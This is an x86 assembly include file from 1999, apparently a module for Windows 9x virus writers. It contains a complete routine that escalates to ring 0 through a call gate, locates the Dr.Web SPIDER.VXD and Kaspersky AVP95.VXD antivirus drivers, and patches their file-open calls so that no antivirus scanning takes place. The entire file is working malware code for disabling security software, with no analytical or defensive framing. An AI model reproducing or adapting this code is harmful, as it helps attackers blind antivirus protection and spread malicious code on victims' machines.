
; release 1.00          30-05-99
; release 1.01          13-12-99
;   -- r0 via LDT/callgate (much better)
;   -- bugfix (now multi-patch)

; file:                 PTCHAVXD.INC

; subroutine:           Win9X_Patch_AV_VxDs

; input registers:      none
; modified registers:   none
; output registers:     EAX: (see FL_xxx consts)
;                         bit 0: SPIDER.VXD found
;                         bit 1: SPIDER.VXD patched
;                         bit 2: AVP95.VXD found
;                         bit 3: AVP95.VXD patched
;                         bit 4: internal error occured when entering ring0,
;                                but was handled by SEH

; action:               enter ring0, then find & patch SPIDER.VXD & AVP95.VXD
;
;                       after patch VxDs will lose ability to open files,
;                       so no av check will be performed
;
;                       PATCH STRUCTURE:
;
;       Control_Proc_0: ....  ; assumed what c_p_0 is located before B8 xxxx
;                       ....
;                       B8 00 D5 00 00  -->  B8 FF FF FF FF     ; if found
;                       ....
;                       B8 01 D5 00 00  -->  B8 FF FF FF FF     ; if found
;                       ....

; VxDcalls used:
;
;   VXDLDR_GetDeviceList - to get device list to find needed VxDs
;   VMM_PageQuery        - to check each scanning page for presence


FL_SPIDER_FOUND         equ     00000001h
FL_SPIDER_KILLED        equ     00000002h
FL_AVP_FOUND            equ     00000004h
FL_AVP_KILLED           equ     00000008h
FL_ERROR_R0             equ     00000010h

include                 callgate.inc

Win9X_Patch_AV_VxDs:    pusha

                        call    kavxd_seh_init

kavxd_seh_handler:      mov     esp, [esp+8]    ; eh_establisherframe
                        mov     ebp, 10000b
                        jmp     kavxd_seh_done

kavxd_seh_init:         push    dword ptr fs:[0]; init SEH
                        mov     fs:[0], esp

                        call    kavxd_pop_addr

                        call    kavxd_ring0code
                        retf

kavxd_pop_addr:         pop     esi
                        call    call_in_ring0

kavxd_seh_done:         pop     dword ptr fs:[0]; done SEH
                        pop     eax

                        mov     [esp+7*4], ebp  ; pushad_eax <-

                        popa

                        ret

kavxd_ring0code:        VxDcall VXDLDR, GetDeviceList
                        ; see also: VMM_GetDDBList

                        xor     ebp, ebp        ; out flags

kavxd_scanvxd:          mov     ebx, [eax+5]    ; VxD_Desc_Block *DI_DDB

                        cmp     ebx, 0C0000000h ; once i saw EBX=1 here
                        jb      kavxd_continue

                        lea     ecx, [ebx+0Ch]  ; Name_0

                        mov     edx, 0001b
                        cmp     [ecx], 'DIPS'   ; 'SPIDER  '
                        je      kavxd_patch

                        mov     edx, 0100b
                        cmp     [ecx], '9PVA'   ; 'AVP95   '
                        je      kavxd_patch

kavxd_continue:         mov     eax, [eax]
                        or      eax, eax
                        jnz     kavxd_scanvxd

                        ret

kavxd_patch:            or      ebp, edx

                        mov     esi, 0000D500h     ; R0_OPENCREATFILE
                        call    kavxd_fuck_moveax

                        mov     esi, 0000D501h     ; R0_OPENCREAT_IN_CONTEXT
                        call    kavxd_fuck_moveax

                        jmp     kavxd_continue

kavxd_fuck_moveax:      pusha

                        mov     edi, [ebx+18h]  ; Control_Proc_0

                        ; scan forward

kavxd_1:                lea     ecx, [edi+4]    ; check presence for
                        test    ecx, 00000FFFh  ; each new page encountered
                        jnz     kavxd_2

                        pusha

                        sub     esp, 28
                        mov     esi, esp

                        push    28
                        push    esi             ; esi = MEMORY_BASIC_INFO
                        push    ecx
                        VMMcall PageQuery

                        test    dword ptr [esi+10h], 1000h ; mbi_state & MEM_COMMIT

                        lea     esp, [esp + 4*3 + 28]

                        popa
                        jnz     kavxd_2

                        popa
                        ret

kavxd_2:                inc     edi

                        cmp     [edi], esi           ; B8 <esi>
                        jne     kavxd_1
                        cmp     byte ptr [edi-1], 0B8h
                        jne     kavxd_1

                        mov     dword ptr [edi], -1  ; R0_xxx <-- 0xFFFFFFFF

                        popa

                        shl     edx, 1
                        or      ebp, edx
                        shr     edx, 1

                        pusha
                        jmp     kavxd_1


